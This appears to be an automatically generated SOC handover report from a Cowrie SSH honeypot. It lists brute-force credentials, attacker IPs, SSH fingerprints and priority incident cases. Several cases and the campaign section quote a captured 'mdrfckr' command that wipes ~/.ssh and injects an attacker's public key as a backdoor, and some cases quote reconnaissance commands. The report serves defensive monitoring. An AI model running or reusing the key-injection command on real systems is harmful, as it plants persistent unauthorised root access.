# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-11 |
| **Generated At** | 2026-05-11T11:28:52Z |
| **Shift Time** | 11:28 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **333** |
| Confirmed Threats | **260** |
| False Positives Filtered | **73** (21.9%) |
| Unique Attacker IPs | **47** |
| Countries of Origin | **23** |
| High Severity Cases | **17** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **316** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **137** |
| Unique Credential Pairs | **92** |
| Unique Usernames | **35** |
| Unique Passwords | **85** |
| Successful Auth Pairs | **16** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 42 |
| `root` | 17 |
| `admin` | 15 |
| `345gs5662d34` | 6 |
| `user` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `admin` | 5 |
| `test` | 4 |
| `q1w2e3` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `root` | `3245gs5662d34` | 6 |
| `admin` | `admin` | 2 |
| `ubuntu` | `admin12` | 2 |
| `userftp` | `1qaz2wsx` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `test@1234` | `120.48.106.235` | 2026-05-11T08:25:28 |
| `root` | `3245gs5662d34` | `120.48.106.235` | 2026-05-11T08:25:46 |
| `root` | `admin` | `185.38.149.131` | 2026-05-11T09:31:45 |
| `root` | `adminHW` | `185.38.149.131` | 2026-05-11T09:31:47 |
| `root` | `webserver` | `45.78.198.162` | 2026-05-11T09:36:23 |
| `root` | `admin123!!!` | `119.205.179.217` | 2026-05-11T09:44:35 |
| `root` | `3245gs5662d34` | `119.205.179.217` | 2026-05-11T09:44:38 |
| `root` | `test@1234` | `45.78.198.162` | 2026-05-11T09:52:44 |
| `root` | `3245gs5662d34` | `45.78.198.162` | 2026-05-11T09:52:57 |
| `root` | `` | `192.42.116.101` | 2026-05-11T10:39:55 |
| `root` | `admin123!!!` | `211.253.37.225` | 2026-05-11T10:43:41 |
| `root` | `3245gs5662d34` | `211.253.37.225` | 2026-05-11T10:43:45 |
| `root` | `` | `192.42.116.58` | 2026-05-11T10:48:03 |
| `root` | `gitlab` | `185.158.22.150` | 2026-05-11T11:06:33 |
| `root` | `3245gs5662d34` | `185.158.22.150` | 2026-05-11T11:06:38 |
| `root` | `test$123` | `185.158.22.150` | 2026-05-11T11:20:01 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **333** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 160 |
| AsyncSSH (Python) | 5 |
| Go SSH scanner | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 125 | 5 |
| `03a80b21afa8...` | Modern SSH client | 22 | 8 |
| `fda360b1b4f4...` | Mirai/variant | 5 | 2 |
| `087ab61de4f8...` | Mirai/variant | 2 | 2 |
| `19532158b559...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 125 | 5 | libssh-based |
| `03a80b21afa8...` | libssh | 22 | 8 | Modern SSH client |
| `95420f9d932d...` | libssh | 12 | 2 | — |
| `fda360b1b4f4...` | AsyncSSH (Python) | 5 | 2 | Mirai/variant |
| `087ab61de4f8...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `19532158b559...` | libssh | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `120.48.106.235`, `185.158.22.150`, `211.253.37.225`, `119.205.179.217`, `45.78.198.162`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **47** |
| Unique ASNs | **39** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS215125` | Church of Cyberology | 2 | HIGH |
| `AS45609` | Bharti Airtel Ltd. AS for GPRS Service | 1 | LOW |
| `AS150436` | Byteplus Pte. Ltd. | 1 | HIGH |
| `AS24835` | Vodafone Data | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (17)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-27fbc8865774

| Field | Detail |
|---|---|
| **Source IP** | `120.48.106[.]235` |
| **First Seen** | 2026-05-11 08:25 |
| **Last Seen** | 2026-05-11 08:25 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 08:25:24` | `cowrie.session.connect` |
| `2026-05-11 08:25:24` | `cowrie.client.version` |
| `2026-05-11 08:25:26` | `cowrie.client.kex` |
| `2026-05-11 08:25:28` | `cowrie.login.success` |
| `2026-05-11 08:25:30` | `cowrie.session.params` |
| `2026-05-11 08:25:30` | `cowrie.command.input` |
| `2026-05-11 08:25:30` | `cowrie.command.failed` |
| `2026-05-11 08:25:30` | `cowrie.log.closed` |
| `2026-05-11 08:25:31` | `cowrie.session.params` |
| `2026-05-11 08:25:31` | `cowrie.command.input` |
| `2026-05-11 08:25:32` | `cowrie.session.file_download` |
| `2026-05-11 08:25:32` | `cowrie.log.closed` |
| `2026-05-11 08:25:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.106[.]235` to AbuseIPDB if not already reported
- [ ] Block `120.48.106[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e20ac98c9205

| Field | Detail |
|---|---|
| **Source IP** | `120.48.106[.]235` |
| **First Seen** | 2026-05-11 08:25 |
| **Last Seen** | 2026-05-11 08:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 08:25:40` | `cowrie.session.connect` |
| `2026-05-11 08:25:40` | `cowrie.client.version` |
| `2026-05-11 08:25:40` | `cowrie.client.kex` |
| `2026-05-11 08:25:46` | `cowrie.login.success` |
| `2026-05-11 08:25:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.106[.]235` to AbuseIPDB if not already reported
- [ ] Block `120.48.106[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24c552a63c95

| Field | Detail |
|---|---|
| **Source IP** | `185.38.149[.]131` |
| **First Seen** | 2026-05-11 09:31 |
| **Last Seen** | 2026-05-11 09:32 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `display deviceInfo, display version, vspa display mg info, sip display register, display sip info` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 09:31:44` | `cowrie.session.connect` |
| `2026-05-11 09:31:45` | `cowrie.login.success` |
| `2026-05-11 09:31:45` | `cowrie.session.params` |
| `2026-05-11 09:31:47` | `cowrie.command.input` |
| `2026-05-11 09:31:47` | `cowrie.command.failed` |
| `2026-05-11 09:31:54` | `cowrie.command.input` |
| `2026-05-11 09:31:54` | `cowrie.command.failed` |
| `2026-05-11 09:32:01` | `cowrie.command.input` |
| `2026-05-11 09:32:01` | `cowrie.command.failed` |
| `2026-05-11 09:32:12` | `cowrie.command.input` |
| `2026-05-11 09:32:12` | `cowrie.command.failed` |
| `2026-05-11 09:32:24` | `cowrie.command.input` |
| `2026-05-11 09:32:24` | `cowrie.command.failed` |
| `2026-05-11 09:32:34` | `cowrie.log.closed` |
| `2026-05-11 09:32:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.38.149[.]131` to AbuseIPDB if not already reported
- [ ] Block `185.38.149[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df2e7562013c

| Field | Detail |
|---|---|
| **Source IP** | `185.38.149[.]131` |
| **First Seen** | 2026-05-11 09:31 |
| **Last Seen** | 2026-05-11 09:32 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `display deviceInfo, display version, vspa display mg info, sip display register, display sip info` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 09:31:46` | `cowrie.session.connect` |
| `2026-05-11 09:31:47` | `cowrie.login.success` |
| `2026-05-11 09:31:47` | `cowrie.session.params` |
| `2026-05-11 09:31:48` | `cowrie.command.input` |
| `2026-05-11 09:31:48` | `cowrie.command.failed` |
| `2026-05-11 09:31:55` | `cowrie.command.input` |
| `2026-05-11 09:31:55` | `cowrie.command.failed` |
| `2026-05-11 09:32:03` | `cowrie.command.input` |
| `2026-05-11 09:32:03` | `cowrie.command.failed` |
| `2026-05-11 09:32:14` | `cowrie.command.input` |
| `2026-05-11 09:32:14` | `cowrie.command.failed` |
| `2026-05-11 09:32:26` | `cowrie.command.input` |
| `2026-05-11 09:32:26` | `cowrie.command.failed` |
| `2026-05-11 09:32:36` | `cowrie.log.closed` |
| `2026-05-11 09:32:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.38.149[.]131` to AbuseIPDB if not already reported
- [ ] Block `185.38.149[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23a8ffbb4240

| Field | Detail |
|---|---|
| **Source IP** | `45.78.198[.]162` |
| **First Seen** | 2026-05-11 09:35 |
| **Last Seen** | 2026-05-11 09:36 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 09:35:57` | `cowrie.session.connect` |
| `2026-05-11 09:35:57` | `cowrie.client.version` |
| `2026-05-11 09:35:58` | `cowrie.client.kex` |
| `2026-05-11 09:36:23` | `cowrie.login.success` |
| `2026-05-11 09:36:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.198[.]162` to AbuseIPDB if not already reported
- [ ] Block `45.78.198[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab52bd5161f3

| Field | Detail |
|---|---|
| **Source IP** | `119.205.179[.]217` |
| **First Seen** | 2026-05-11 09:44 |
| **Last Seen** | 2026-05-11 09:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 09:44:34` | `cowrie.session.connect` |
| `2026-05-11 09:44:34` | `cowrie.client.version` |
| `2026-05-11 09:44:34` | `cowrie.client.kex` |
| `2026-05-11 09:44:35` | `cowrie.login.success` |
| `2026-05-11 09:44:35` | `cowrie.session.params` |
| `2026-05-11 09:44:35` | `cowrie.command.input` |
| `2026-05-11 09:44:35` | `cowrie.command.failed` |
| `2026-05-11 09:44:35` | `cowrie.log.closed` |
| `2026-05-11 09:44:35` | `cowrie.session.params` |
| `2026-05-11 09:44:35` | `cowrie.command.input` |
| `2026-05-11 09:44:36` | `cowrie.session.file_download` |
| `2026-05-11 09:44:36` | `cowrie.log.closed` |
| `2026-05-11 09:44:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.205.179[.]217` to AbuseIPDB if not already reported
- [ ] Block `119.205.179[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d526ad9c1f3e

| Field | Detail |
|---|---|
| **Source IP** | `119.205.179[.]217` |
| **First Seen** | 2026-05-11 09:44 |
| **Last Seen** | 2026-05-11 09:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 09:44:38` | `cowrie.session.connect` |
| `2026-05-11 09:44:38` | `cowrie.client.version` |
| `2026-05-11 09:44:38` | `cowrie.client.kex` |
| `2026-05-11 09:44:38` | `cowrie.login.success` |
| `2026-05-11 09:44:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.205.179[.]217` to AbuseIPDB if not already reported
- [ ] Block `119.205.179[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a99fb91e4b8

| Field | Detail |
|---|---|
| **Source IP** | `45.78.198[.]162` |
| **First Seen** | 2026-05-11 09:52 |
| **Last Seen** | 2026-05-11 09:52 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 09:52:42` | `cowrie.session.connect` |
| `2026-05-11 09:52:42` | `cowrie.client.version` |
| `2026-05-11 09:52:42` | `cowrie.client.kex` |
| `2026-05-11 09:52:44` | `cowrie.login.success` |
| `2026-05-11 09:52:44` | `cowrie.session.params` |
| `2026-05-11 09:52:44` | `cowrie.command.input` |
| `2026-05-11 09:52:44` | `cowrie.command.failed` |
| `2026-05-11 09:52:45` | `cowrie.log.closed` |
| `2026-05-11 09:52:45` | `cowrie.session.params` |
| `2026-05-11 09:52:45` | `cowrie.command.input` |
| `2026-05-11 09:52:45` | `cowrie.session.file_download` |
| `2026-05-11 09:52:45` | `cowrie.log.closed` |
| `2026-05-11 09:52:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.198[.]162` to AbuseIPDB if not already reported
- [ ] Block `45.78.198[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6e51f03c011

| Field | Detail |
|---|---|
| **Source IP** | `45.78.198[.]162` |
| **First Seen** | 2026-05-11 09:52 |
| **Last Seen** | 2026-05-11 09:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 09:52:53` | `cowrie.session.connect` |
| `2026-05-11 09:52:53` | `cowrie.client.version` |
| `2026-05-11 09:52:56` | `cowrie.client.kex` |
| `2026-05-11 09:52:57` | `cowrie.login.success` |
| `2026-05-11 09:52:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.198[.]162` to AbuseIPDB if not already reported
- [ ] Block `45.78.198[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3271eb5e3c92

| Field | Detail |
|---|---|
| **Source IP** | `192.42.116[.]101` |
| **First Seen** | 2026-05-11 10:39 |
| **Last Seen** | 2026-05-11 10:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo "bash --help; ls /proc/1/; cat /proc/1/mounts; cat /proc/cpuinfo; echo __1778495997707897391" | sh, bash --help; ls /proc/1/; cat /proc/1/mounts; cat /proc/cpuinfo; echo __1778495997707897391
` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 10:39:54` | `cowrie.session.connect` |
| `2026-05-11 10:39:54` | `cowrie.client.version` |
| `2026-05-11 10:39:54` | `cowrie.client.kex` |
| `2026-05-11 10:39:55` | `cowrie.login.success` |
| `2026-05-11 10:39:56` | `cowrie.client.size` |
| `2026-05-11 10:39:57` | `cowrie.session.params` |
| `2026-05-11 10:39:58` | `cowrie.command.input` |
| `2026-05-11 10:39:58` | `cowrie.command.input` |
| `2026-05-11 10:39:58` | `cowrie.command.input` |
| `2026-05-11 10:40:02` | `cowrie.log.closed` |
| `2026-05-11 10:40:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.42.116[.]101` to AbuseIPDB if not already reported
- [ ] Block `192.42.116[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3355d2038a2d

| Field | Detail |
|---|---|
| **Source IP** | `211.253.37[.]225` |
| **First Seen** | 2026-05-11 10:43 |
| **Last Seen** | 2026-05-11 10:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 10:43:40` | `cowrie.session.connect` |
| `2026-05-11 10:43:40` | `cowrie.client.version` |
| `2026-05-11 10:43:40` | `cowrie.client.kex` |
| `2026-05-11 10:43:41` | `cowrie.login.success` |
| `2026-05-11 10:43:41` | `cowrie.session.params` |
| `2026-05-11 10:43:41` | `cowrie.command.input` |
| `2026-05-11 10:43:41` | `cowrie.command.failed` |
| `2026-05-11 10:43:41` | `cowrie.log.closed` |
| `2026-05-11 10:43:42` | `cowrie.session.params` |
| `2026-05-11 10:43:42` | `cowrie.command.input` |
| `2026-05-11 10:43:42` | `cowrie.session.file_download` |
| `2026-05-11 10:43:42` | `cowrie.log.closed` |
| `2026-05-11 10:43:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.37[.]225` to AbuseIPDB if not already reported
- [ ] Block `211.253.37[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75c79209ed43

| Field | Detail |
|---|---|
| **Source IP** | `211.253.37[.]225` |
| **First Seen** | 2026-05-11 10:43 |
| **Last Seen** | 2026-05-11 10:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 10:43:44` | `cowrie.session.connect` |
| `2026-05-11 10:43:44` | `cowrie.client.version` |
| `2026-05-11 10:43:44` | `cowrie.client.kex` |
| `2026-05-11 10:43:45` | `cowrie.login.success` |
| `2026-05-11 10:43:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.37[.]225` to AbuseIPDB if not already reported
- [ ] Block `211.253.37[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f54896c3c917

| Field | Detail |
|---|---|
| **Source IP** | `192.42.116[.]58` |
| **First Seen** | 2026-05-11 10:48 |
| **Last Seen** | 2026-05-11 10:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo "bash --help; ls /proc/1/; cat /proc/1/mounts; cat /proc/cpuinfo; echo __1778496484709354614" | sh, bash --help; ls /proc/1/; cat /proc/1/mounts; cat /proc/cpuinfo; echo __1778496484709354614
` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 10:48:01` | `cowrie.session.connect` |
| `2026-05-11 10:48:01` | `cowrie.client.version` |
| `2026-05-11 10:48:02` | `cowrie.client.kex` |
| `2026-05-11 10:48:03` | `cowrie.login.success` |
| `2026-05-11 10:48:03` | `cowrie.client.size` |
| `2026-05-11 10:48:04` | `cowrie.session.params` |
| `2026-05-11 10:48:04` | `cowrie.command.input` |
| `2026-05-11 10:48:04` | `cowrie.command.input` |
| `2026-05-11 10:48:04` | `cowrie.command.input` |
| `2026-05-11 10:48:09` | `cowrie.log.closed` |
| `2026-05-11 10:48:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.42.116[.]58` to AbuseIPDB if not already reported
- [ ] Block `192.42.116[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f584f855c9f

| Field | Detail |
|---|---|
| **Source IP** | `185.158.22[.]150` |
| **First Seen** | 2026-05-11 11:06 |
| **Last Seen** | 2026-05-11 11:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 11:06:32` | `cowrie.session.connect` |
| `2026-05-11 11:06:32` | `cowrie.client.version` |
| `2026-05-11 11:06:32` | `cowrie.client.kex` |
| `2026-05-11 11:06:33` | `cowrie.login.success` |
